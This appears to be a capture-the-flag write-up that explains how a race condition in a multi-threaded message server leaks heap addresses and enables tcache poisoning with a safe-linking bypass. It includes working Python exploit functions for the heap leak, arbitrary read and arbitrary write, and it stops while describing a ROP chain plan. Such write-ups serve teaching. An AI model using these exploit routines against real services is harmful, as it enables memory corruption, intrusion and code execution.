# Race condition and tcache poisoning

Here I am sharing a very interesting challenge that involves race condition and tcache poisoning (an easy heap attack)

# Vulnerability

Let's dive right into the vulnerability of the binary file. First thing first, here are the simplified source code:

```c
void *handle_connection(void *fd) {
    FILE *in = fdopen((long)fd, "r");
    FILE *out = fdopen((long)fd, "w");
    setvbuf(in, NULL, _IONBF, 0);
    setvbuf(out, NULL, _IONBF, 1);

    fprintf(stderr, "Handling connection on FD %d\n", (int)fd);
    vuln(in, out);
    fprintf(stderr, "Closing connection on FD %d\n", (int)fd);

    close((long)fd);
    pthread_exit(0);
}

int main() {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int option = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &option, sizeof(option));
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(1337);
    bind(server_fd, (struct sockaddr *) &server_addr, sizeof(server_addr));
    listen(server_fd, 4096);

    while (1) {
        pthread_t thread;
        long connection_fd = accept(server_fd, NULL, NULL);
        pthread_create(&thread, NULL, handle_connection, (void *)connection_fd);
    }
}

```
the above presents a multi-threaded TCP server which allows multiple connections to it at the same time. If you do not know what a multi-threaded server is, that is ok, because I also am not very sure lol. I only know that it handles multiple threads (like processes) at the same time.

Below is the vulnerable main function that would be run in each threads. Since the original source code decompiled by ghidra is overwhelmingly complicated to read, here is a simplified version that is good enough for us to understand the vulnerability.
```c
char *messages[16] = { 0 };
int stored[16] = { 0 };

void vuln(FILE *in, FILE *out) {
    fprintf(out, "Welcome to the message server! Commands: malloc/scanf/printf/free/quit.\n");
    char input[1024];
    int idx;

    while (1)
    {
        if (fscanf(in, "%s", input) == EOF) break;
        if (strcmp(input, "quit") == 0) break;
        if (fscanf(in, "%d", &idx) == EOF) break;

        if (strcmp(input, "printf") == 0) {
            if (fprintf(out, "MESSAGE: %s\n", stored[idx] ? messages[idx] : "NONE") < 0) break;
        }
        else if (strcmp(input, "malloc") == 0) {
            if (!stored[idx]) messages[idx] = malloc(1024);
            stored[idx] = 1;
        }
        else if (strcmp(input, "scanf") == 0) {
            fscanf(in, "%1024s", stored[idx] ? messages[idx] : input);
        }
        else if (strcmp(input, "free") == 0) {
            if (stored[idx]) free(messages[idx]);
            stored[idx] = 0;
        }
        else fprintf(stderr, "INVALID COMMAND %s %#llx\n", input, *(unsigned long long*)input);
    }
}
```
Actually, if it is a single threaded process, the above function would be secure. It is only vulnerable in the context that it is a multi-threaded program. 

Why? 

because of race condition, we are able to leak a heap address, perform tcache poisoning to do arbitrary read and write.

## What is a race condition and how it matters in above program

Race condition is about processes, programs, or instructions getting mixed up in an order that allows us to perform a malicious sequence of operations

Using the above program as example:

when we run the following in terminal, each operations are supposed to run in a normal sequence
```
$ nc localhost 1337
Welcome to the message server! Commands: malloc/scanf/printf/free/quit.

malloc 0 // 0 is the index of a heap chunk, so that we can access it later 

scanf 0 AAAA // editing the chunk

free 0 // delete the chunk

printf 0 // print the content of the chunk 
```
they should be running in a sequence like:
```
malloc --> scanf --> free --> printf
```
and since we deleted the chunk before printing its content, it should output `MESSAGE: NONE`

However, if we create the following 2 loops and keeps them running **AT THE SAME TIME**:
```
# LOOP 1

malloc 0 

scanf 0 AAAA 

free 0 
```
```
# LOOP 2 

printf 0
```
Then, the ordering of the operations would differ, which we could get:
```
malloc --> scanf --> printf --> free 

malloc --> printf --> scanf --> free 

printf --> malloc --> scanf --> free

etc.
```

So that's the basic idea of race condition, so how does this help in our exploit?
Let's take a closer look into the `free` and `printf` operation

Under `free`, we have:
```
if (stored[idx]) 
	free(messages[idx]);

stored[idx] = 0;
```
We can see that it carefully checks whether `stored[idx]` is already 0 before freeing to protect against double free. And setting it to 0 after freeing to protect against use-after-free. So there are 2 operations inside `free` operation:

```
free --> stored[idx] = 0
```

and in inside of a `printf("%s", a)` function, there are also various instructions, for example:
```
strlen(a) --> ?? --> ?? --> write(1, a, length)
```

Since this is a multi-threaded process, we can run two threads and thus two loops at the same time, like the example loop I mentioned above:
```
# LOOP 1

malloc 0 

scanf 0 AAAA 

free 0 
```
```
# LOOP 2 

printf 0
```

and ideally, we would like to see the a few operations mixed up in the following sequences, where `printf 0` is broken down into `strlen(a)` and `write(1, a, length)` and being mixed with free

```
strlen(a) --> free 0 --> write(1, a, length) --> stored[0] = 0
```

thus, we can bypass the protection in `free` operation and print something inside a freed chunk, likely a **heap address**. So we get a heap address with the following python exploit code that uses the idea I went through above:

```py
def leak_tcache(r1, r2):
	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
	
	# os.fork() == 0 is the child, child does the following
		for _ in range(10000):
			r1.sendline(b"malloc 0")
			r1.sendline(b"scanf 0")
			r1.sendline(b"AAAABBBB")
			r1.sendline(b"free 0") # hope for write() of printf to go right after this
		exit(0) # kills the child
		
	# else, parent (os.fork() returns pid
	else:
		for _ in range(10000):
			r2.sendline(b"printf 0")
		os.wait() # waits for the child to finish
	output_set = set(r2.clean().splitlines())
	# .clean() gets the output
	# .splitlines() split the output by lines
	# set() gets the unique lines
	print(output_set)
	for output in output_set:
		output = output[9:]
		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
			result = output[:6]
			print(result)
			return u64(result.ljust(8, b'\x00'))
	return 0
```


# tcache poisoning

after getting a heap address leak, we can break safe-linking perform tcache poisoning! I will now explain what safe-linking and tcache poisoning are.

First of all, what is a tcachebin?

tcachebin is like one of the type of rubbish bin in heap. It is where the `freed` aka deleted chunks go into. And it supports a `FILO` (First in Last Out) mechanism. And the chunks would have a `next pointer` or `foward pointer` which points to the chunk that is `freed` just a moment earlier before it.

For example, if we do:
```
malloc 0
malloc 1
free 1
free 0
```
Then the tcachebin would becomes:
```
[0x410] chunk 0 --> chunk 1
```
The inside of chunk 0 would look like:
```
offset 0: prev_size field (you don't need to know what this is) 
offset 0x8: size of chunk 0
offset 0x10: <address of chunk 1> // points to chunk 1
...
```

The most important thing you need to know here is that chunk 0 carries an address that points to chunk 1. That is also why tcachebin looks like this:
```
[0x410] chunk 0 --> chunk 1
```
By the way, `[0x410]` is the size slot representing the size of the freed chunks. Chunks that are linked together (one points to the other) must be within same size slot.

And when we malloc chunk of sizes the same as chunk 0 and chunk 1 in tcachebin, the first malloc gets chunk 0 and the second malloc gets chunk 1 (`FILO`). Therefore:
```
malloc 0
malloc 1
free 1
free 0
malloc 2 // gets chunk 0 in tcache
malloc 100 // gets chunk 1 in tcache
```
Note that `2` and `100` above is just an index we later use to access that specific chunk, it's not the chunk size.

we can see from the simplified source code that, the size we malloc is always `1024`, so as long as tcachebin is not full (maximum size of a size slot is 7), they will always be going in and out from tcachebin
```
        else if (strcmp(input, "malloc") == 0) {
            if (!stored[idx]) messages[idx] = malloc(1024);
            stored[idx] = 1;
        }
```

Now let's go back to this:

```
[0x410] chunk 0 --> chunk 1
```
```
offset 0: prev_size field (you don't need to know what this is) 
offset 0x8: size of chunk 0
offset 0x10: <address of chunk 1> // points to chunk 1
...
```

So now that you know the basic structure of tcachebin, we can talk about tcache poisoning. 
So tcache poisoning just means we change to address that chunk 0 points to, so it becomes something like:
```
[0x410] chunk 0 --> <arbitrary address>
```
The reason why we do this is because we can a chunk to be malloc'd at `<arbirary address>`, then we can either leak or modify the content of that address.

That's it, that's tcache poisoning!

But here one more thing, `<arbitrary address>` is not really arbitrary addresses. Because of safe-linking, the address has to be ending with a `0` bit. For example, `0x7267d80008a0` would work but `0x7267d80008a8` wouldn't work! Here I will talk a bit more about safe-linking. Safe-linking is a protection to tcachebin that the `foward pointers` in tachebins are mangled with the heap base address of the chunk that stores the forward pointers using XOR. What exactly does it mean

Let's take a look at this example:
```
offset 0: prev_size field (you don't need to know what this is) 
offset 0x8: size of chunk 0
offset 0x10: <address of chunk 1> // points to chunk 1
...
```
here the stored forward of chunk 0 :`<address of chunk 1>`, because of safe-linking, is not the actual address of chunk 1. It is actually: 
```
<actual address of chunk 1> ^ <base address of chunk 0>
```
So for example, if the address of chunk 1 (where chunk 0 points to) is `0x7267d80008a0`, and that base address of chunk 0 is `0x7267d8005`. Then the stored address would be `0x7267d80008a0 ^ 0x7267d8005 = 0x7260fe7d88a5`.

What I mean by base address is the an address being right shifted by 12 bits. For example: `0x7267d8005xxx >> 12 = 0x7267d8005`

SO that's it, that's all about safe-linking and tcache poisoning.

If unfortunately you do not understand safe-linking, it is not that important, it is just a protection that we need to bypass. We can still move on to the stuff below

But if you do not understand tcache poisoning, perhaps you need to re-read the above or free feel to ask me!
## How to apply tcache poisoning in this challenge

SO if you understand what I have been yapping above. You will know that tcache poisoning requires to edit the content of a `freed` chunk. Which is a use-after-free vulnerability

Let's recall what the program does:
```
        else if (strcmp(input, "free") == 0) {
            if (stored[idx]) free(messages[idx]);
            stored[idx] = 0;
        }
```
the program has protection against use-after-free, using a `stored[idx]` to track the state of the chunks.

So again, we need to make use of race condition to bypass this. 

But this time we would race `scanf` operation against to `free` operation, so the flow we want to achieve is below:
```
free 0 --> scanf 0 <content> --> stored[0] = 0
```
We want `scanf` operation to be fit between `free` and the modification of `stored[0]`

The following would be able to achieve this:
```py
def controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s):
	global idx
	r1.clean()
	r2.clean()
	
	
	addr_packed = p64(addr ^ heap_base_addr)
	xor_result = addr ^ heap_base_addr
	print(f"addr: {hex(addr)}")
	print(f"heap_base: {hex(heap_base_addr)}")  
	print(f"XOR result: {hex(xor_result)}")
	
	
	r1.sendline(f"malloc 0".encode()) # chunk B
	r1.sendline(f"malloc {idx}".encode()) # chunk B
	r1.sendline(f"free {idx}".encode()) # free B
	
	while True:
		#print("Running Arbitrary Read on Address: ", hex(addr))
		if os.fork() == 0:
			r1.sendline(f"free 0".encode()) # free A
			os.kill(os.getpid(), 9)
		else:
			r2.send((f"scanf 0 ".encode() + addr_packed + b"\n") * 2000)
			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
			# overwriting freed A's next pointer to be the target address
			os.wait()
		
		time.sleep(0.1)
		
		r1.sendline(f"malloc 0".encode()) # this malloc gets A
		r1.sendline(f"printf 0".encode())
		r1.readuntil(b"MESSAGE: ")
		stored = r1.readline()[:-1] #

		
		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
			break

	r1.sendline(f"malloc {idx}".encode()) # gets B (returned at injected address's location
	#if debug:
	#	gdb.attach(p, s)
	#	print(f"{idx}")
	#	r1.interactive()
	r1.sendline(f"free 0".encode()) # free the chunk so we can reuse it later, so that the base address of 0 never changes
	r1.clean()
	idx += 1
```


With the above, `chunk {idx}` would be the chunk we get on our second malloc and its address would be on a desired address we want, if you don't know what I am talking about, recall this:
```
[0x410] chunk 0 --> <arbitrary address>
```

Once we can control our allocations to arbitrary addresses, we can do arbitrary read and write. 


To arbitrarily read, we just need to `printf` the content of that "chunk" we malloc'd:
```
def arbitrary_read(r1, r2, addr, heap_base_addr, debug, p, s):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
	
	r1.sendline(f"printf {idx - 1}".encode())
	
	r1.readuntil(b"MESSAGE: ")
	output = r1.readline()[:-1]
	leak = u64(output.ljust(8, b'\x00')) 
	return leak
```
To arbitrarily write, we just need to `scanf` and inject payload to that "chunk" we malloc'd:
```
def arbitrary_write(r1, r2, addr, heap_base_addr, content, debug, p, s):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
	if debug:
		gdb.attach(p, s)
		pause()
		r1.sendline(f"scanf {idx - 1}".encode())
		r1.sendline(content)
		r1.interactive()
	r1.sendline(f"scanf {idx - 1}".encode())
	r1.sendline(content)
#	r1.interactive()
```

# Playing with programs with arbitrary read and write primitives

Once we get arbitrary read and write primitives, we can finally have real fun with the program. 


My plan was to
Use arbitrary read to get:
```
1. libc leak for ROP chain
2. a random leak to get a stack leak (because only around that region we can get a stack address)
3. stack leak to write our ROP chain on the stack
```
Actual code:
```
		location1 = ((leak & ~0xff) << 12) + 0x8a0
		print(hex(location1))
		
		libc_leak = arbitrary_read(r1, r2, location1, leak, 0, p, s)
```
from offset `+0x8a0` on the `leak` (which is the heap base address we got from `leak_tcache`) it contains a libc address. I know this by doing:
